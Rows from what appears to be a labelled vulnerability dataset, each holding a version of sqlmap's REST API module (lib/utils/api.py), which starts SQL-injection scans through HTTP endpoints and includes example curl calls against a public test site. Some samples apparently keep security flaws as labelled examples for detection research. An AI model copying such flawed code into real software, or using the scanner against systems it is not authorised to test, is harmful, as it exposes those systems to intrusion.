    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == ""gevent"":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == ""eventlet"":
            import eventlet
            eventlet.monkey_patch()
        logger.debug(""Using adapter '%s' to run bottle"" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if ""already in use"" in getSafeExString(ex):
            logger.error(""Address already in use ('%s:%s')"" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = ""Adapter '%s' is not available on this system"" % adapter
        if adapter in (""gevent"", ""eventlet""):
            errMsg += "" (e.g.: 'sudo apt-get install python-%s')"" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug(""Calling %s"" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error(""Failed to load and parse %s"" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """"""
    REST-JSON API client
    """"""

    dbgMsg = ""Example client access from command line:""
    dbgMsg += ""\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid"" % (host, port)
    dbgMsg += ""\n\t$ curl -H \""Content-Type: application/json\"" -X POST -d '{\""url\"": \""http://testphp.vulnweb.com/artists.php?artist=1\""}' http://%s:%d/scan/$taskid/start"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/data"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/log"" % (host, port)
    logger.debug(dbgMsg)

    addr = ""http://%s:%d"" % (host, port)
    logger.info(""Starting REST-JSON API client to '%s'..."" % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = ""There has been a problem while connecting to the ""
            errMsg += ""REST-JSON API server at '%s' "" % addr
            errMsg += ""(%s)"" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info(""Type 'help' or '?' for list of available commands"")

    while True:
        try:
            command = raw_input(""api%s> "" % ("" (%s)"" % taskid if taskid else """")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in (""data"", ""log"", ""status"", ""stop"", ""kill""):
            if not taskid:
                logger.error(""No task ID in use"")
                continue
            raw = _client(""%s/scan/%s/%s"" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            dataToStdout(""%s\n"" % raw)

        elif command.startswith(""new""):
            if ' ' not in command:
                logger.error(""Program arguments are missing"")
                continue

            argv = [""sqlmap.py""] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client(""%s/task/new"" % addr)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to create new task"")
                continue
            taskid = res[""taskid""]
            logger.info(""New task ID is '%s'"" % taskid)

            raw = _client(""%s/scan/%s/start"" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to start scan"")
                continue
            logger.info(""Scanning started"")

        elif command.startswith(""use""):
            taskid = (command.split()[1] if ' ' in command else """").strip(""'\"""")
            if not taskid:
                logger.error(""Task ID is missing"")
                taskid = None
                continue
            elif not re.search(r""\A[0-9a-fA-F]{16}\Z"", taskid):
                logger.error(""Invalid task ID '%s'"" % taskid)
                taskid = None
                continue
            logger.info(""Switching to task ID '%s' "" % taskid)

        elif command in (""list"", ""flush""):
            raw = _client(""%s/admin/%s/%s"" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            elif command == ""flush"":
                taskid = None
            dataToStdout(""%s\n"" % raw)

        elif command in (""exit"", ""bye"", ""quit"", 'q'):
            return

        elif command in (""help"", ""?""):
            msg =  ""help        Show this help message\n""
            msg += ""new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \""http://testphp.vulnweb.com/artists.php?artist=1\""')\n""
            msg += ""use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n""
            msg += ""data        Retrieve and show data for current task\n""
            msg += ""log         Retrieve and show log for current task\n""
            msg += ""status      Retrieve and show status for current task\n""
            msg += ""stop        Stop current task\n""
            msg += ""kill        Kill current task\n""
            msg += ""list        Display all tasks\n""
            msg += ""flush       Flush tasks (delete all tasks)\n""
            msg += ""exit        Exit this client\n""

            dataToStdout(msg)

        elif command:
            logger.error(""Unknown command '%s'"" % command)
/n/n/n",1
58,b4bb4c393b26072b9a47f787be134888b983af60,"lib/utils/api.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
""""""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = """"
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who=""server""):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug(""REST-JSON API %s connected to IPC database"" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not ""locked"" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith(""SELECT""):
            return self.cursor.fetchall()

    def init(self):
        self.execute(""CREATE TABLE logs(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, time TEXT, ""
                  ""level TEXT, message TEXT""
                  "")"")

        self.execute(""CREATE TABLE data(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, status INTEGER, ""
                  ""content_type INTEGER, value TEXT""
                  "")"")

        self.execute(""CREATE TABLE errors(""
                    ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                    ""taskid INTEGER, error TEXT""
                    "")"")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {""boolean"": False, ""string"": None, ""integer"": None, ""float"": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists(""sqlmap.py""):
            self.process = Popen([""python"", ""sqlmap.py"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen([""sqlmap"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype=""stdout""):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == ""stdout"":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == ""stdout"":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                ""SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?"",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute(""DELETE FROM data WHERE id = ?"",
                                                     (output[index][0],))

                conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = ""%s%s"" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute(""UPDATE data SET value = ? WHERE id = ?"",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute(""INSERT INTO errors VALUES(NULL, ?, ?)"",
                                         (self.taskid, str(value) if value else """"))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """"""
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """"""
        conf.database_cursor.execute(""INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)"",
                                     (conf.taskid, time.strftime(""%X""), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, ""api""):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect(""client"")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, ""%s ('%s')"" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook(""after_request"")
def security_headers(json_header=True):
    """"""
    Set some headers across all HTTP responses
    """"""
    response.headers[""Server""] = ""Server""
    response.headers[""X-Content-Type-Options""] = ""nosniff""
    response.headers[""X-Frame-Options""] = ""DENY""
    response.headers[""X-XSS-Protection""] = ""1; mode=block""
    response.headers[""Pragma""] = ""no-cache""
    response.headers[""Cache-Control""] = ""no-cache""
    response.headers[""Expires""] = ""0""
    if json_header:
        response.content_type = ""application/json; charset=UTF-8""

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return ""Access denied""


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return ""Nothing here""


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return ""Method not allowed""


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return ""Internal server error""

#############################
# Task management functions #
#############################


# Users' methods
@get(""/task/new"")
def task_new():
    """"""
    Create new task ID
    """"""
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug(""Created new task: '%s'"" % taskid)
    return jsonize({""success"": True, ""taskid"": taskid})


@get(""/task/<taskid>/delete"")
def task_delete(taskid):
    """"""
    Delete own task ID
    """"""
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug(""[%s] Deleted task"" % taskid)
        return jsonize({""success"": True})
    else:
        logger.warning(""[%s] Invalid task ID provided to task_delete()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

###################
# Admin functions #
###################


@get(""/admin/<taskid>/list"")
def task_list(taskid=None):
    """"""
    List task pull
    """"""
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))[""status""]

    logger.debug(""[%s] Listed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True, ""tasks"": tasks, ""tasks_num"": len(tasks)})

@get(""/admin/<taskid>/flush"")
def task_flush(taskid):
    """"""
    Flush task spool (delete all tasks)
    """"""

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug(""[%s] Flushed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get(""/option/<taskid>/list"")
def option_list(taskid):
    """"""
    List options for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_list()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    logger.debug(""[%s] Listed task options"" % taskid)
    return jsonize({""success"": True, ""options"": DataStore.tasks[taskid].get_options()})


@post(""/option/<taskid>/get"")
def option_get(taskid):
    """"""
    Get the value of an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_get()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    option = request.json.get(""option"", """")

    if option in DataStore.tasks[taskid].options:
        logger.debug(""[%s] Retrieved value for option %s"" % (taskid, option))
        return jsonize({""success"": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug(""[%s] Requested value for unknown option %s"" % (taskid, option))
        return jsonize({""success"": False, ""message"": ""Unknown option"", option: ""not set""})


@post(""/option/<taskid>/set"")
def option_set(taskid):
    """"""
    Set an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_set()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug(""[%s] Requested to set options"" % taskid)
    return jsonize({""success"": True})


# Handle scans
@post(""/scan/<taskid>/start"")
def scan_start(taskid):
    """"""
    Launch a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_start()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug(""[%s] Started scan"" % taskid)
    return jsonize({""success"": True, ""engineid"": DataStore.tasks[taskid].engine_get_id()})


@get(""/scan/<taskid>/stop"")
def scan_stop(taskid):
    """"""
    Stop a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_stop()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_stop()

    logger.debug(""[%s] Stopped scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/kill"")
def scan_kill(taskid):
    """"""
    Kill a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_kill()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_kill()

    logger.debug(""[%s] Killed scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/status"")
def scan_status(taskid):
    """"""
    Returns status of a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_status()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if DataStore.tasks[taskid].engine_process() is None:
        status = ""not running""
    else:
        status = ""terminated"" if DataStore.tasks[taskid].engine_has_terminated() is True else ""running""

    logger.debug(""[%s] Retrieved scan status"" % taskid)
    return jsonize({
        ""success"": True,
        ""status"": status,
        ""returncode"": DataStore.tasks[taskid].engine_get_returncode()
    })


@get(""/scan/<taskid>/data"")
def scan_data(taskid):
    """"""
    Retrieve the data of a scan
    """"""
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_data()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            ""SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_data_message.append(
            {""status"": status, ""type"": content_type, ""value"": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            ""SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug(""[%s] Retrieved scan data and error messages"" % taskid)
    return jsonize({""success"": True, ""data"": json_data_message, ""error"": json_errors_message})


# Functions to handle scans' logs
@get(""/scan/<taskid>/log/<start>/<end>"")
def scan_log_limited(taskid, start, end):
    """"""
    Retrieve a subset of log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning(""[%s] Invalid start or end value provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid start or end value, must be digits""})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            (""SELECT time, level, message FROM logs WHERE ""
             ""taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC""),
            (taskid, start, end)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages subset"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


@get(""/scan/<taskid>/log"")
def scan_log(taskid):
    """"""
    Retrieve the log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ""SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC"", (taskid,)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


# Function to handle files inside the output directory
@get(""/download/<taskid>/<target>/<filename:path>"")
def download(taskid, target, filename):
    """"""
    Download a certain file from the file system
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to download()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    path = os.path.abspath(os.path.join(paths.SQLMAP_OUTPUT_PATH, target, filename))
    # Prevent file path traversal
    if not path.startswith(paths.SQLMAP_OUTPUT_PATH):
        logger.warning(""[%s] Forbidden path (%s)"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""Forbidden path""})

    if os.path.isfile(path):
        logger.debug(""[%s] Retrieved content of file %s"" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({""success"": True, ""file"": file_content.encode(""base64"")})
    else:
        logger.warning(""[%s] File does not exist %s"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""File does not exist""})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """"""
    REST-JSON API server
    """"""
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix=""sqlmapipc-"", text=False)[1]

    logger.info(""Running REST-JSON API server at '%s:%d'.."" % (host, port))
    logger.info(""Admin ID: %s"" % DataStore.admin_id)
    logger.debug(""IPC database: %s"" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == ""gevent"":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == ""eventlet"":
            import eventlet
            eventlet.monkey_patch()
        logger.debug(""Using adapter '%s' to run bottle"" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if ""already in use"" in getSafeExString(ex):
            logger.error(""Address already in use ('%s:%s')"" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = ""Adapter '%s' is not available on this system"" % adapter
        if adapter in (""gevent"", ""eventlet""):
            errMsg += "" (e.g.: 'sudo apt-get install python-%s')"" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug(""Calling %s"" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error(""Failed to load and parse %s"" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """"""
    REST-JSON API client
    """"""

    dbgMsg = ""Example client access from command line:""
    dbgMsg += ""\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid"" % (host, port)
    dbgMsg += ""\n\t$ curl -H \""Content-Type: application/json\"" -X POST -d '{\""url\"": \""http://testphp.vulnweb.com/artists.php?artist=1\""}' http://%s:%d/scan/$taskid/start"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/data"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/log"" % (host, port)
    logger.debug(dbgMsg)

    addr = ""http://%s:%d"" % (host, port)
    logger.info(""Starting REST-JSON API client to '%s'..."" % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = ""There has been a problem while connecting to the ""
            errMsg += ""REST-JSON API server at '%s' "" % addr
            errMsg += ""(%s)"" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info(""Type 'help' or '?' for list of available commands"")

    while True:
        try:
            command = raw_input(""api%s> "" % ("" (%s)"" % taskid if taskid else """")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in (""data"", ""log"", ""status"", ""stop"", ""kill""):
            if not taskid:
                logger.error(""No task ID in use"")
                continue
            raw = _client(""%s/scan/%s/%s"" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            dataToStdout(""%s\n"" % raw)

        elif command.startswith(""new""):
            if ' ' not in command:
                logger.error(""Program arguments are missing"")
                continue

            argv = [""sqlmap.py""] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client(""%s/task/new"" % addr)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to create new task"")
                continue
            taskid = res[""taskid""]
            logger.info(""New task ID is '%s'"" % taskid)

            raw = _client(""%s/scan/%s/start"" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to start scan"")
                continue
            logger.info(""Scanning started"")

        elif command.startswith(""use""):
            taskid = (command.split()[1] if ' ' in command else """").strip(""'\"""")
            if not taskid:
                logger.error(""Task ID is missing"")
                taskid = None
                continue
            elif not re.search(r""\A[0-9a-fA-F]{16}\Z"", taskid):
                logger.error(""Invalid task ID '%s'"" % taskid)
                taskid = None
                continue
            logger.info(""Switching to task ID '%s' "" % taskid)

        elif command in (""list"", ""flush""):
            raw = _client(""%s/admin/%s/%s"" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            elif command == ""flush"":
                taskid = None
            dataToStdout(""%s\n"" % raw)

        elif command in (""exit"", ""bye"", ""quit"", 'q'):
            return

        elif command in (""help"", ""?""):
            msg =  ""help        Show this help message\n""
            msg += ""new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \""http://testphp.vulnweb.com/artists.php?artist=1\""')\n""
            msg += ""use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n""
            msg += ""data        Retrieve and show data for current task\n""
            msg += ""log         Retrieve and show log for current task\n""
            msg += ""status      Retrieve and show status for current task\n""
            msg += ""stop        Stop current task\n""
            msg += ""kill        Kill current task\n""
            msg += ""list        Display all tasks\n""
            msg += ""flush       Flush tasks (delete all tasks)\n""
            msg += ""exit        Exit this client\n""

            dataToStdout(msg)

        elif command:
            logger.error(""Unknown command '%s'"" % command)
/n/n/n",0
59,b4bb4c393b26072b9a47f787be134888b983af60,"/lib/utils/api.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
""""""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = """"
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who=""server""):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug(""REST-JSON API %s connected to IPC database"" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not ""locked"" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith(""SELECT""):
            return self.cursor.fetchall()

    def init(self):
        self.execute(""CREATE TABLE logs(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, time TEXT, ""
                  ""level TEXT, message TEXT""
                  "")"")

        self.execute(""CREATE TABLE data(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, status INTEGER, ""
                  ""content_type INTEGER, value TEXT""
                  "")"")

        self.execute(""CREATE TABLE errors(""
                    ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                    ""taskid INTEGER, error TEXT""
                    "")"")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
